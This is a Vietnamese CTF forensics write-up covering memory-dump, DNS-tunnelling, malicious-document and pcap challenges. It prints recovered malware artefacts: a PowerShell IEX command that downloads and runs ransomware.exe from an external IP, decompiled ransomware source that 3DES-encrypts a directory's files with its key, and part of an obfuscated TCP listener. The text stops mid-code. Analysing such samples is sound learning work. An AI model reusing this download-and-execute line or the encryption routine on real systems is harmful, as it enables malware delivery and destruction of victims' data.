--- 
title: "AKASEC CTF"
date: 2024-08-30T08:20:31+07:00
tags: [Forensics]
author: [1]
---

## 1.For/Portugal
> I accidentally left my computer unlocked at the coffee shop while I stepped away. I'm sure that someone took advantage of the opportunity and was searching for something.
Author : d33znu75

Bài cho 1 file .zip chứa 1 file memdump. Mình dùng plugin pslist của vol3 để xem nó có gì không.
```
➜  Portugal /home/cozybear/RealCoZy/ToolList/volatility3/vol.py -f memdump1.mem windows.pslist
Volatility 3 Framework 2.7.0
Progress:  100.00               PDB scanning finished
PID     PPID    ImageFileName   Offset(V)       Threads Handles SessionId       Wow64   CreateTime      ExitTime        File output

4       0       System  0x8453eb40      110     -       N/A     False   2024-05-28 10:35:34.000000      N/A     Disabled
276     4       smss.exe        0x89897040      3       -       N/A     False   2024-05-28 10:35:34.000000      N/A     Disabled
352     340     csrss.exe       0x89875c40      10      -       0       False   2024-05-28 10:35:34.000000      N/A     Disabled
412     340     wininit.exe     0x8f264c40      5       -       0       False   2024-05-28 10:35:35.000000      N/A     Disabled
420     404     csrss.exe       0x8f274c40      13      -       1       False   2024-05-28 10:35:35.000000      N/A     Disabled
464     404     winlogon.exe    0x8f289c40      7       -       1       False   2024-05-28 10:35:35.000000      N/A     Disabled
504     412     services.exe    0x899dda40      18      -       0       False   2024-05-28 10:35:35.000000      N/A     Disabled
512     412     lsass.exe       0x8f2af040      11      -       0       False   2024-05-28 10:35:35.000000      N/A     Disabled
596     504     svchost.exe     0x8f330040      37      -       0       False   2024-05-28 10:35:35.000000      N/A     Disabled
644     504     svchost.exe     0x8f33f500      15      -       0       False   2024-05-28 10:35:35.000000      N/A     Disabled
720     464     dwm.exe 0x8f369040      13      -       1       False   2024-05-28 10:35:35.000000      N/A     Disabled
836     504     svchost.exe     0x8f3bfb00      55      -       0       False   2024-05-28 10:35:35.000000      N/A     Disabled
848     504     svchost.exe     0x8f860300      29      -       0       False   2024-05-28 10:35:35.000000      N/A     Disabled
880     504     svchost.exe     0x8f9857c0      24      -       0       False   2024-05-28 10:35:35.000000      N/A     Disabled
1004    504     svchost.exe     0x84539880      25      -       0       False   2024-05-28 10:35:35.000000      N/A     Disabled
1020    504     svchost.exe     0x845b0840      15      -       0       False   2024-05-28 10:35:35.000000      N/A     Disabled
1036    504     svchost.exe     0x845da040      38      -       0       False   2024-05-28 10:35:35.000000      N/A     Disabled
1196    504     svchost.exe     0x845bb600      26      -       0       False   2024-05-28 10:35:35.000000      N/A     Disabled
1296    504     spoolsv.exe     0x8f8f0040      7       -       0       False   2024-05-28 10:35:36.000000      N/A     Disabled
1476    504     svchost.exe     0x921630c0      13      -       0       False   2024-05-28 10:35:36.000000      N/A     Disabled
1712    504     MsMpEng.exe     0x984514c0      26      -       0       False   2024-05-28 10:35:36.000000      N/A     Disabled
1720    504     svchost.exe     0x98453c40      10      -       0       False   2024-05-28 10:35:36.000000      N/A     Disabled
1180    836     sihost.exe      0x984e4580      17      -       1       False   2024-05-28 10:35:37.000000      N/A     Disabled
2140    836     taskeng.exe     0x98473a00      7       -       0       False   2024-05-28 10:35:37.000000      N/A     Disabled
2160    464     userinit.exe    0x9a0b2040      0       -       1       False   2024-05-28 10:35:37.000000      2024-05-28 10:36:04.000000    Disabled
2228    2160    explorer.exe    0x87a0ec40      64      -       1       False   2024-05-28 10:35:37.000000      N/A     Disabled
2488    596     RuntimeBroker.  0x9d62f900      8       -       1       False   2024-05-28 10:35:38.000000      N/A     Disabled
2536    836     taskhostw.exe   0x9d632040      9       -       1       False   2024-05-28 10:35:38.000000      N/A     Disabled
2620    1020    dasHost.exe     0x9d6cb8c0      18      -       0       False   2024-05-28 10:35:40.000000      N/A     Disabled
2832    504     SearchIndexer.  0x8144e040      15      -       0       False   2024-05-28 10:35:41.000000      N/A     Disabled
2924    504     NisSrv.exe      0x92185040      9       -       0       False   2024-05-28 10:35:41.000000      N/A     Disabled
3180    596     SkypeHost.exe   0x8147ac40      7       -       1       False   2024-05-28 10:35:42.000000      N/A     Disabled
3328    596     WmiPrvSE.exe    0x9d60e9c0      10      -       0       False   2024-05-28 10:35:43.000000      N/A     Disabled
3464    596     ShellExperienc  0x8153c580      27      -       1       False   2024-05-28 10:35:44.000000      N/A     Disabled
3572    596     SearchUI.exe    0x81583c40      37      -       1       False   2024-05-28 10:35:44.000000      N/A     Disabled
3780    596     dllhost.exe     0x88fa7980      9       -       1       False   2024-05-28 10:35:44.000000      N/A     Disabled
4088    2832    SearchProtocol  0xa2e4a040      7       -       1       False   2024-05-28 10:35:46.000000      N/A     Disabled
1596    2832    SearchFilterHo  0x985745c0      6       -       0       False   2024-05-28 10:35:46.000000      N/A     Disabled
1740    2832    SearchProtocol  0x9a1e8940      7       -       0       False   2024-05-28 10:35:47.000000      N/A     Disabled
3980    1004    audiodg.exe     0x81438640      9       -       0       False   2024-05-28 10:35:54.000000      N/A     Disabled
800     2228    FTK Imager.exe  0x8f213c00      22      -       1       False   2024-05-28 10:35:55.000000      N/A     Disabled
728     2228    OneDrive.exe    0xa2e47c40      22      -       1       False   2024-05-28 10:35:55.000000      N/A     Disabled
1240    2228    chrome.exe      0x9d7d7c40      40      -       1       False   2024-05-28 10:35:56.000000      N/A     Disabled
1272    1240    chrome.exe      0xa2ec2840      8       -       1       False   2024-05-28 10:35:56.000000      N/A     Disabled
2316    1240    chrome.exe      0x9d787340      14      -       1       False   2024-05-28 10:35:58.000000      N/A     Disabled
4104    1240    chrome.exe      0x89928480      16      -       1       False   2024-05-28 10:35:58.000000      N/A     Disabled
4112    1240    chrome.exe      0x9d7df900      7       -       1       False   2024-05-28 10:35:58.000000      N/A     Disabled
4752    1240    chrome.exe      0x9d7df300      7       -       1       False   2024-05-28 10:36:03.000000      N/A     Disabled
4900    1240    chrome.exe      0x815e66c0      15      -       1       False   2024-05-28 10:36:15.000000      N/A     Disabled
4968    1240    chrome.exe      0x9d63e040      15      -       1       False   2024-05-28 10:36:16.000000      N/A     Disabled
5284    596     dllhost.exe     0x8159cc40      1       -       1       False   2024-05-28 10:36:31.000000      N/A     Disabled
```
Thấy có nhiều tiến trình chrome.exe nên mình nghĩ là author đã search gì đó trên chrome. Ở đây mình có 2 cách để làm bài này.

*Cách 1: Sử dụng plugin chromehistory của vol2*
```bash
(venv) cozybear@cozybear:~/RealCoZy/volatility$ python vol.py -f /../../CTF/2024/AKASEC\ CTF/Forensics/Portugal/memdump1.mem --profile=Win10x86 chromehistory
Volatility Foundation Volatility Framework 2.6.1
Index  URL                                                                              Title
                                                 Visits Typed Last Visit Time            Hidden Favicon ID
------ -------------------------------------------------------------------------------- -------------------------------------------------------------------------------- ------ ----- -------------------------- ------ ----------
    21 https://www.google.com/search?q=9-+Y_&s...BGAqSBwMzLjagB8st&sclient=gws-wiz-serp 9- Y_ - Recherche Google                                                              2     0 2024-05-28 02:51:46.820554        N/A
    24 https://www.google.com/search?q=12-+ch&...EYFJIHAzQuNqAHsyw&sclient=gws-wiz-serp 12- ch - Recherche Google                                                             2     0 2024-05-28 02:52:17.549779        N/A
    23 https://www.google.com/search?q=11-+r_&...EYFJIHAzMuNqAHuSU&sclient=gws-wiz-serp 11- r_ - Recherche Google                                                             2     0 2024-05-28 02:52:08.117933        N/A
    22 https://www.google.com/search?q=10-+f0&...SSBwUxLjYuMaAHoys&sclient=gws-wiz-serp 10- f0 - Recherche Google                                                             2     0 2024-05-28 02:51:58.554055        N/A
    28 https://www.google.com/search?q=14-+m3&...EYFJIHAzMuNqAHwCQ&sclient=gws-wiz-serp 14- m3 - Recherche Google                                                             2     0 2024-05-28 02:54:23.297460        N/A
    27 https://www.google.com/search?q=13-+r0&...BGBSSBwMxLjagB5Qn&sclient=gws-wiz-serp 13- r0 - Recherche Google                                                             2     0 2024-05-28 02:54:13.281851        N/A
    60 https://www.google.com/search?q=look+!!...jBqN6gCALACAA&sourceid=chrome&ie=UTF-8 look !! its here yay - Recherche Google                                               2     0 2024-05-28 10:21:27.769063        N/A
    41 https://www.google.com/search?q=18-+h_&...EYFJIHAzIuNqAHwCg&sclient=gws-wiz-serp 18- h_ - Recherche Google                                                             2     0 2024-05-28 02:58:34.283051        N/A
    40 https://www.google.com/search?q=21-+0r&...BGBSSBwMyLjagB_8m&sclient=gws-wiz-serp 21- 0r - Recherche Google                                                             2     0 2024-05-28 02:58:16.846367        N/A
    39 https://www.google.com/search?q=19-+h1&...U���u�U
                                                        �����]�
                                                               �����������̋�U���u �U
                                                                                    �!���]�
                                                                                           �����������̋
                                           -1     0 1601-01-01 00:00:00               N/A
    38 https://www.google.com/search?q=20-+st&...wLjMuMS4wLjKgB4Ak&sclient=gws-wiz-serp 20- st - Recherche Google                                                             2     0 2024-05-28 02:57:55.750520        N/A
    37 https://www.google.com/search?q=22-+y%7...wcyLjUuNC0xoAeSIg&sclient=gws-wiz-serp 22- y} - Recherche Google                                                             2     0 2024-05-28 02:57:40.251468        N/A
    30 https://www.google.com/search?q=16-+34&...HBzMuNS4wLjGgB8Uf&sclient=gws-wiz-serp 16- 34 - Recherche Google                                                             2     0 2024-05-28 02:54:40.616572        N/A
    29 https://www.google.com/search?q=15-+_s&...EYFJIHAzMuNqAH3iI&sclient=gws-wiz-serp 15- _s - Recherche Google                                                             2     0 2024-05-28 02:54:33.267901        N/A
     6 https://www.google.com/search?q=3-+EC&s...�l�(�X                                                               0     0 1601-01-01 00:00:00               N/A
     3 https://www.google.com/search?q=1-+AK&s...�E
���%����E                                          �Ё���u
         � ЉVf��t
                 f��tf��uT�G@                                                           -117     0 1601-01-01 00:00:00               N/A
     3 https://www.google.com/search?q=1-+AK&s...                                                               0     0 1601-01-01 00:00:00               N/A
    13 https://www.google.com/search?q=6-+4T&s...BGAqSBwMxLjWgB-Mk&sclient=gws-wiz-serp 6- 4T - Recherche Google                                                              2     0 2024-05-28 02:48:50.824655        N/A
     8 https://www.google.com/search?q=5-+0L&s...AYIkgcDMS41oAfEJQ&sclient=gws-wiz-serp 5- 0L - Recherche Google                                                              2     0 2024-05-28 02:47:32.309413        N/A
     7 https://www.google.com/search?q=4-+%7BV...gDAJIHAzQuNaAH6jU&sclient=gws-wiz-serp 4- {V - Recherche Google                                                              2     0 2024-05-28 02:47:15.630030        N/A
     6 https://www.google.com/search?q=3-+EC&s...BGAqSBwMzLjSgB94m&sclient=gws-wiz-serp 3- EC - Recherche Google                                                              2     0 2024-05-28 02:47:03.137648        N/A
     4 https://www.google.com/search?q=2-+AS&s...RgKkgcDNy41oAfTMg&sclient=gws-wiz-serp 2- AS - Recherche Google                                                              2     0 2024-05-28 02:45:40.828749        N/A
     3 https://www.google.com/search?q=1-+AK&s...�P���������R���� �(V
           0     0 1601-01-01 00:00:00               N/A
    36 https://www.google.com/search?q=17-+rc&...HBzEuNS4wLjGgB-It&sclient=gws-wiz-serp 17- rc - Recherche Google                                                             2     0 2024-05-28 02:57:24.214070        N/A
    15 https://www.google.com/search?q=8-+1T&s...pIHBTMuNS4xoAfeIg&sclient=gws-wiz-serp 8- 1T - Recherche Google                                                              2     0 2024-05-28 02:49:12.465347        N/A
    14 https://www.google.com/search?q=7-+1L&s...BGBSSBwMyLjWgB7cq&sclient=gws-wiz-serp 7- 1L - Recherche Google                                                              2     0 2024-05-28 02:48:59.903786        N/A
    39 https://www.google.com/search?q=19-+h1&...BGBSSBwMyLjagB-8p&sclient=gws-wiz-serp 19- h1 - Recherche Google                                                             2     0 2024-05-28 02:58:06.309885        N/A
ISkL)��1���6�[/www.google.com/search?q=8-+1T&s...���
              �[�[�Ë؋s< �tx�~ ��N-�P�u��                                                             87     0 1601-01-01 00:00:00               N/A
     3 https://www.google.com/search?q=1-+AK&s...BGBSSBwM2LjOgB-Yn&sclient=gws-wiz-serp 1- AK - Recherche Google                                                              2     0 2024-05-28 02:45:26.511498        N/A
    29 https://www.google.com/search?q=15-+_s&...EYFJIHAzMuNqAH3iI&sclient=gws-wiz-serp 15- _s - Recherch�p#
                                                 0     0 1601-01-01 00:00:00               N/A
```
Để ý kĩ ta thấy cờ được chia thành các phần nhỏ, đính kèm cả thứ tự. Chỉ cần sắp xếp lại là ta có được cờ.

*Cách 2: Dump file History*
Khi tìm kiếm bằng Chrome trên Window. Lịch sử sẽ được lưu ở file History. Mình dùng filescan để tìm kiếm.
```
/home/cozybear/RealCoZy/ToolList/volatility3/vol.py -f memdump1.mem windows.filescan | grep "History"
0x81595680 100.0\Users\d33znu75\AppData\Local\Google\Chrome\User Data\Default\History   128
0x9845ab30      \ProgramData\Microsoft\Windows Defender\Scans\History\CacheManager\MpScanCache-0.bin    128
```
Sau đó dump nó ra bằng plugin dumpfile. Cat file ta sẽ thấy các link tìm kiếm. Tương tự tìm kiếm hết các link sẽ có được cờ đầy đủ.

FLAG: `AKASEC{V0L4T1TY_f0r_chr0m3_s34rch_h1st0ry}`

## 2.For/Sussy
>Something Fishy's Going on in Our Network
Author : d33znu75

Đề bài cho 1 file pcapng. Mở file lên và tìm kiếm một lúc,mình để ý các luồng DNS có gì đó:

![image](https://hackmd.io/_uploads/SJ0tjH220.png)

Kĩ thuật này gọi là DNS Tunneling. Mình sẽ filter chúng ra và chỉnh sửa lại một chút để dễ xem hơn.
```
# Lọc dữ liệu từ DNS stream
tshark -r packet.pcapng -Y "dns" -T fields -e dns.qry.name > out.txt

# Giữ lại các dòng chứa akasec.ma 
grep "akasec.ma" out.txt > out2.txt

# Loại bỏ trùng lặp
cat out2.txt | uniq > out3.txt
```
Sau đó mình loại bỏ từ akasec.ma bằng VScode. Đưa vào Cyberchef, mình nhận được 1 file 7z. Nó yêu cầu mật khẩu nên mình crack bằng john > pass: `hellokitty`. Sau đó ta được 1 file flag. Đó là 1 file PDF yêu cầu password. Tương tự dùng john > pass: `meow`. Ta được flag sau khi mở.

FLAG: `AKASEC{PC4P_DNS_3xf1ltr4t10n_D0n3!!}`

## 3.For/SAVEME
> You know what to do.Get after it!
WARNING: "It's a malware,BE CAREFUL"
Author: samaqlo

Đề bài cho 1 file zip chứa 1 file .docm và 1 số file png,jpeg. Thử dùng olevba với file docm như mình thường làm nhưng nó không ra gì. Mở nó lên bằng trình đọc trên Kali, ta có thể thấy 1 số trang với chữ bị ẩn đi.

![Screenshot 2024-09-10 001931](https://hackmd.io/_uploads/HJd_CihnA.png)

Copy all, bỏ vào VScode, dùng Replace bỏ đi `&H`. Đưa vào Cyberchef, ta thấy đó là 1 file PE 32. Save nó và dùng Virustotal check, nói chung là đỏ lòm luôn. Ý tưởng của mình là xem nó được viết bằng gì sau đó decompile nó. Dùng DIE thử:
```
──(kali㉿kali)-[~/Downloads]
└─$ diec fuckingMS.exe --heuristicscan --verbose
[HEUR/About] Generic Heuristic Analysis by DosX (@DosX_dev)
[HEUR] Scanning has begun!
[HEUR] Scanning to programming language has started!
[HEUR] Scan completed.
PE32
    Operation system: Windows(95)[I386, 32-bit, GUI]
    Linker: GNU Linker ld (GNU Binutils)(2.56*)[GUI32]
    Compiler: MinGW
    Language: C/C++
    (Heur)Protection: Generic[No IAT]
    (Heur)Packer: Packer detected[Section 1 (".data") compressed]
```
Nó được viết bằng C/C++. Mình thử run nó trên ANYRUN nhưng không hiểu sao ANYRUN của mình nó không bao giờ chạy ra cái gì :))). Thử decompile nó bằng IDA pro cũng không thành công (tất nhiên vì nó bị packed). DIE cũng không phát hiện ra công cụ packed nó. Mình tìm kiếm trình giả lập Window thì nó ra cái `speakeasy`. Nhưng cũng không được, nó báo error read. Stuck mãi thì mình nhớ ra 1 chall của BtSCTF mình có sử dụng `scdbg` để chạy Window API. Thử sử dụng nó ai ngờ ra thật.
```
Loaded 122a bytes from file C:\Users\ozkado\DOWNLO~1\Ohshit.exe
Testing 4650 offsets  |  Percent Complete: 99%  |  Completed in 281 ms
0) offset=0x401        steps=MAX    final_eip=7c86250d   WinExec
Loaded 122a bytes from file C:\Users\ozkado\DOWNLO~1\Ohshit.exe
Initialization Complete..
Max Steps: 2000000
Using base offset: 0x401000
Execution starts at file offset 401
401401  DAD9                            fcmovu st(0),st(1)
401403  B88A0C4406                      mov eax,0x6440c8a
401408  D97424F4                        fstenv [esp-0xc]
40140c  5D                              pop ebp
40140d  29C9                            sub ecx,ecx


4014c4  WinExec(powershell "IEX(New-Object Net.webClient).downloadString('http://20.81.130.178:8080/ransomware.exe')")
4014d0  GetVersion()
4014e3  ExitProcess(0)

Stepcount 555874
```
Nó download 1 file theo URL `http://20.81.130.178:8080/ransomware.exe`. Do mình giải lại sau giải nên mình phải tìm file này từ [1 bài WU khác](https://github.com/rex69420/ctf-writeups/blob/main/Akasec%20CTF%202024/forensics/saveme/solution/ransomware.exe). Dùng DIE ta biết nó là 1 file .NET. Dùng Dotpeek để decompile nó ra, mình thấy có 3 hàm nhỏ hơn trong đó. Trong đó hàm b(): 
```csharp!
// Decompiled with JetBrains decompiler
// Type: b
// Assembly: ransomware, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 81F24F4C-AD49-415D-95E1-CE0D740B8FA4
// Assembly location: C:\Users\ozkado\Downloads\ransomware.exe

using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;

#nullable disable
internal class b
{
  private static void a([In] string[] obj0)
  {
    string str1 = "Lp3jXluuW799rnu4";
    byte[] numArray1 = new byte[8]
    {
      (byte) 0,
      (byte) 1,
      (byte) 2,
      (byte) 3,
      (byte) 4,
      (byte) 5,
      (byte) 6,
      (byte) 7
    };
    \u003CModule\u003E.h = 2081625616;
    byte[] numArray2 = numArray1;
    string currentDirectory = Directory.GetCurrentDirectory();
    \u003CModule\u003E.k = -1592258590;
    \u003CModule\u003E.a = (object) null;
    \u003CModule\u003E.n = -1592516334;
    \u003CModule\u003E.l = -1437277352;
    \u003CModule\u003E.d = (object) 1386028750;
    string[] files = Directory.GetFiles(currentDirectory, "*.*");
    \u003CModule\u003E.n = 2136656571;
    string[] strArray1 = files;
    \u003CModule\u003E.d = (object) null;
    string[] strArray2 = strArray1;
    int index = 0;
    bool flag1;
    \u003CModule\u003E.g = (object) flag1;
    string str2;
    bool flag2;
    while (true)
    {
      \u003CModule\u003E.k = 1326660401;
      \u003CModule\u003E.e = (object) 1818084011;
      int num1 = index;
      string[] strArray3 = strArray2;
      \u003CModule\u003E.j = -1529522494;
      int length = strArray3.Length;
      int num2 = num1 < length ? 1 : 0;
      \u003CModule\u003E.o = 1526447315;
      \u003CModule\u003E.j = 1987339265;
      flag2 = num2 != 0;
      int num3 = flag2 ? 1 : 0;
      \u003CModule\u003E.a = (object) null;
      if (num3 != 0)
      {
        \u003CModule\u003E.j = 1845842485;
        TripleDESCryptoServiceProvider cryptoServiceProvider1;
        \u003CModule\u003E.c = (object) cryptoServiceProvider1;
        str2 = strArray2[index];
        Exception exception1;
        try
        {
          \u003CModule\u003E.q = -759738571;
          \u003CModule\u003E.b = (object) null;
          \u003CModule\u003E.q = 1898371779;
          string path1 = str2;
          global::a.b = (object) flag2;
          byte[] numArray3 = File.ReadAllBytes(path1);
          \u003CModule\u003E.g = (object) null;
          global::a.b = (object) "185ee01d-8c67-459c-9586-6804417e592ce434881f-7f35-4ffd-bdf6-4a1f244e25084e41b92d-afec-";
          \u003CModule\u003E.d = (object) null;
          byte[] numArray4 = numArray3;
          \u003CModule\u003E.h = 1308380089;
          cryptoServiceProvider1 = new TripleDESCryptoServiceProvider();
          TripleDESCryptoServiceProvider cryptoServiceProvider2 = cryptoServiceProvider1;
          Encoding ascii = Encoding.ASCII;
          string s = str1;
          \u003CModule\u003E.k = 401140706;
          byte[] bytes1 = ascii.GetBytes(s);
          cryptoServiceProvider2.Key = bytes1;
          \u003CModule\u003E.o = 1203310366;
          TripleDESCryptoServiceProvider cryptoServiceProvider3 = cryptoServiceProvider1;
          byte[] numArray5 = numArray2;
          c.b = (object) str1;
          cryptoServiceProvider3.IV = numArray5;
          byte[] numArray6 = global::b.b(numArray4, cryptoServiceProvider1);
          string path2 = str2;
          byte[] bytes2 = numArray6;
          \u003CModule\u003E.n = -1749758540;
          File.WriteAllBytes(path2, bytes2);
          global::a.b = (object) "102abfb4-ec8b-4922-9b54-2f17b2c5b52d6d";
          string str3 = str2;
          \u003CModule\u003E.a = (object) exception1;
          Console.WriteLine("Encrypted: " + str3);
          c.b = (object) 1876936332;
        }
        catch (Exception ex)
        {
          \u003CModule\u003E.m = -1040838703;
          exception1 = ex;
          Exception exception2 = exception1;
          global::a.b = (object) cryptoServiceProvider1;
          string str4 = "Error: " + exception2.Message;
          \u003CModule\u003E.o = 1057425350;
          \u003CModule\u003E.d = (object) null;
          Console.WriteLine(str4);
          global::a.b = (object) "dd91927e-4e7c-4176-b90a-bb4a9049b638480c140d-829f-4";
          \u003CModule\u003E.e = (object) 1957620381;
          \u003CModule\u003E.a = (object) null;
          \u003CModule\u003E.m = -1748580011;
          \u003CModule\u003E.m = -1932913121;
          \u003CModule\u003E.q = 2097519326;
        }
        \u003CModule\u003E.c = (object) str2;
        \u003CModule\u003E.k = 480802764;
        \u003CModule\u003E.a = (object) flag2;
        c.b = (object) null;
        \u003CModule\u003E.h = index;
        \u003CModule\u003E.g = (object) str1;
        int num4 = index;
        \u003CModule\u003E.k = 2071185029;
        int num5 = num4 + 1;
        c.a = (object) cryptoServiceProvider1;
        \u003CModule\u003E.g = (object) null;
        // ISSUE: variable of a boxed type
        __Boxed<int> local = (ValueType) 1952428595;
        \u003CModule\u003E.q = 1809257038;
        c.b = (object) local;
        index = num5;
      }
      else
        break;
    }
    Console.ReadLine();
    \u003CModule\u003E.j = index;
    int num = flag2 ? 1 : 0;
    \u003CModule\u003E.o = 721847420;
    \u003CModule\u003E.l = 796469985;
    \u003CModule\u003E.q = -1051365525;
    \u003CModule\u003E.n = index;
    \u003CModule\u003E.f = (object) (bool) num;
    c.a = (object) str2;
  }

  private static byte[] b([In] byte[] obj0, [In] TripleDESCryptoServiceProvider obj1)
  {
    MemoryStream memoryStream = new MemoryStream();
    CryptoStream cryptoStream = new CryptoStream((Stream) memoryStream, obj1.CreateEncryptor(), CryptoStreamMode.Write);
    cryptoStream.Write(obj0, 0, obj0.Length);
    cryptoStream.FlushFinalBlock();
    byte[] array = memoryStream.ToArray();
    memoryStream.Close();
    cryptoStream.Close();
    return array;
  }
}
```
Nó là mã hóa 3DES. Từ đoạn:
```csharp
string str1 = "Lp3jXluuW799rnu4";
    byte[] numArray1 = new byte[8]
    {
      (byte) 0,
      (byte) 1,
      (byte) 2,
      (byte) 3,
      (byte) 4,
      (byte) 5,
      (byte) 6,
      (byte) 7
    };
```
Mình có key = `Lp3jXluuW799rnu4`, và IV = `00 01 02 03 04 05 06 07`. Nếu muốn rõ hơn tại sao numArray1 là IV bạn có thể sử dụng `ILSpy`, ta sẽ được đoạn mã như sau:
```csharp!
tring text = "Lp3jXluuW799rnu4";
                byte[] obj = new byte[8] { 0, 1, 2, 3, 4, 5, 6, 7 };
                <Module>.h = 2081625616;
                byte[] iV = obj;
                string currentDirectory = Directory.GetCurrentDirectory();
                <Module>.k = -1592258590;
                <Module>.a = null;
                <Module>.n = -1592516334;
                <Module>.l = -1437277352;
                <Module>.d = 1386028750;
```
Giờ chỉ cần giải mã từng ảnh.Ở file `images (144).png` ta sẽ tìm được cờ.
![image](https://hackmd.io/_uploads/Hk9lY223R.png)

FLAG: `AKASEC{F_MiCRoSft_777}`

## 4.For/snooz
>don't wake me up, I want a snooze u will find everything on my laptop!!
https://we.tl/t-66EoXGwbVQ
Author: samaqlo

Thử thách cung cấp 2 file bao gồm 1 file .pcapng và 1 file memdump. Mình mở file pcap lên xem có gì extract được không thì được 1 file có tên download.dat. Load nó vào Cyberchef, ta nhận thấy đó là 1 file PE.
![image](https://hackmd.io/_uploads/Hyj50Z03A.png)
Dùng DIE, mình biết nó là 1 file .NET. Dùng Dotpeek decompile mình có được đoạn mã sau:
```csharp
// Decompiled with JetBrains decompiler
// Type: a
// Assembly: snooz, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 5E97E3D5-2139-4CF2-BD79-500B6A4DB0E0
// Assembly location: C:\Users\ozkado\OneDrive - Thuyloi University\download.exe

using System;
using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;

#nullable disable
internal class a
{
  private const int a = 1337;
  private const string b = "fr33___p4l3571n3";

  private static void a()
  {
    TcpListener tcpListener1 = new TcpListener(IPAddress.Any, 1337);
    \u003CModule\u003E.l = -1592258590;
    TcpListener tcpListener2 = tcpListener1;
    // ISSUE: variable of a boxed type
    __Boxed<int> local = (ValueType) 1386028750;
    \u003CModule\u003E.o = 2136656571;
    \u003CModule\u003E.e = (object) local;
    \u003CModule\u003E.a = (object) null;
    tcpListener2.Start();
    bool flag1;
    \u003CModule\u003E.h = (object) flag1;
    while (true)
    {
      bool flag2 = true;
      \u003CModule\u003E.k = 1987339265;
      \u003CModule\u003E.a = (object) null;
      \u003CModule\u003E.g = (object) flag2;
      int length1;
      \u003CModule\u003E.p = length1;
      \u003CModule\u003E.r = -1051365525;
      NetworkStream stream;
      global::b.a = (object) stream;
      TcpClient tcpClient = tcpListener1.AcceptTcpClient();
      \u003CModule\u003E.i = 1057425350;
      stream = tcpClient.GetStream();
      byte[] numArray1 = new byte[1024];
      \u003CModule\u003E.e = (object) null;
      byte[] numArray2 = numArray1;
      \u003CModule\u003E.i = -1411494653;
      NetworkStream networkStream = stream;
      byte[] buffer = numArray2;
      \u003CModule\u003E.k = 1657774894;
      \u003CModule\u003E.q = 744302617;
      int length2 = numArray2.Length;
      length1 = networkStream.Read(buffer, 0, length2);
      byte[] numArray3 = new byte[length1];
      byte[] sourceArray = numArray2;
      byte[] destinationArray = numArray3;
      int n;
      int num1;
      int num2;
      if ((4062 & (length1 << 11) - 5420) != 0)
      {
        int num3 = 4 & (length1 + length1 * 15 ^ 1587);
        n = \u003CModule\u003E.n;
        int num4 = 4 & n << 8 >>> 5;
        num2 = num3 != num4 ? -2076188109 ^ 422676110 : sizeof (long) + 17256;
      }
      else
      {
        num1 = checked (2069871130 - 132655268);
        num2 = num1;
      }
      int num5 = sizeof (Guid) + 18172;
      int num6 = sizeof (float) + 107;
      \u003CModule\u003E.d = (object) \u003CModule\u003E.c(num2, num5, num6);
      int length3 = length1;
      Array.Copy((Array) sourceArray, 0, (Array) destinationArray, 0, length3);
      \u003CModule\u003E.n = -1040838703;
      \u003CModule\u003E.d = (object) length1;
      byte[] numArray4 = numArray3;
      int num7 = (7364 + (num1 << 29) >>> 29 & 2) == (~num1 - 2958 & 2) ? (((n * -1073741824 >>> 10 ^ n * 57 + 7 * n) & 57) == 0 ? Type.EmptyTypes.Length + 45957 : Type.EmptyTypes.Length + 695708289) : -1673074294 ^ 37606627;
      int num8 = checked (1218888041 - 1218841169);
      int num9;
      if ((uint) length1 / 16039U != 2449857621U)
      {
        int q = \u003CModule\u003E.q;
        num9 = 5009 + (q << 20) + 483840 == ~(q * 1073741824) >>> 17 ? Type.EmptyTypes.Length - 1963321438 : Type.EmptyTypes.Length + 182;
      }
      else
      {
        int o = \u003CModule\u003E.o;
        num9 = o * 12966 - -131 != (int) ((uint) o % 256U / 1972U >> 23) ? Type.EmptyTypes.Length - 884098835 : Type.EmptyTypes.Length + 1457581078;
      }
      string str1 = \u003CModule\u003E.c(num7, num8, num9);
      byte[] numArray5 = global::a.b(numArray4, str1);
      \u003CModule\u003E.e = (object) null;
      Encoding utF8 = Encoding.UTF8;
      byte[] bytes = global::a.c(numArray5);
      \u003CModule\u003E.r = 2097519326;
      \u003CModule\u003E.d = (object) \u003CModule\u003E.c(44666, sizeof (int) + 45636, Type.EmptyTypes.Length + 219);
      string str2 = utF8.GetString(bytes);
      string str3 = \u003CModule\u003E.c(sizeof (double) + 21715, 22728, sizeof (Guid) + 95);
      \u003CModule\u003E.i = 1503776956;
      string str4 = str2;
      Console.WriteLine(str3 + str4);
      global::b.b = (object) 1952428595;
      tcpClient.Close();
      \u003CModule\u003E.k = -1529522494;
    }
  }

  private static byte[] b([In] byte[] obj0, [In] string obj1)
  {
    Aes aes1 = Aes.Create();
    ICryptoTransform cryptoTransform1;
    byte[] numArray1;
    bool flag1;
    try
    {
      \u003CModule\u003E.i = 2081625616;
      Aes aes2 = aes1;
      Encoding utF8 = Encoding.UTF8;
      string s = obj1;
      \u003CModule\u003E.m = -1437277352;
      \u003CModule\u003E.r = -1871252905;
      byte[] bytes = utF8.GetBytes(s);
      aes2.Key = bytes;
      Aes aes3 = aes1;
      \u003CModule\u003E.q = -1852116043;
      \u003CModule\u003E.e = (object) null;
      aes3.Mode = CipherMode.ECB;
      \u003CModule\u003E.l = -1410905245;
      ICryptoTransform cryptoTransform2;
      ICryptoTransform cryptoTransform3 = cryptoTransform2;
      \u003CModule\u003E.k = 1845842485;
      \u003CModule\u003E.c = (object) cryptoTransform3;
      Aes aes4 = aes1;
      \u003CModule\u003E.b = (object) null;
      \u003CModule\u003E.h = (object) null;
      string str = \u003CModule\u003E.c(Type.EmptyTypes.Length + 8801, sizeof (uint) + 9765, sizeof (float) + 89);
      bool flag2;
      \u003CModule\u003E.d = (object) flag2;
      \u003CModule\u003E.d = (object) str;
      aes4.Padding = PaddingMode.None;
      \u003CModule\u003E.i = 1308380089;
      ICryptoTransform decryptor = aes1.CreateDecryptor();
      \u003CModule\u003E.m = -1557401652;
      cryptoTransform1 = decryptor;
      try
      {
        \u003CModule\u003E.p = 1203310366;
        ICryptoTransform cryptoTransform4 = cryptoTransform1;
        byte[] inputBuffer = obj0;
        byte[] numArray2 = obj0;
        Aes aes5 = aes1;
        \u003CModule\u003E.o = -2051646939;
        global::b.b = (object) aes5;
        int length = numArray2.Length;
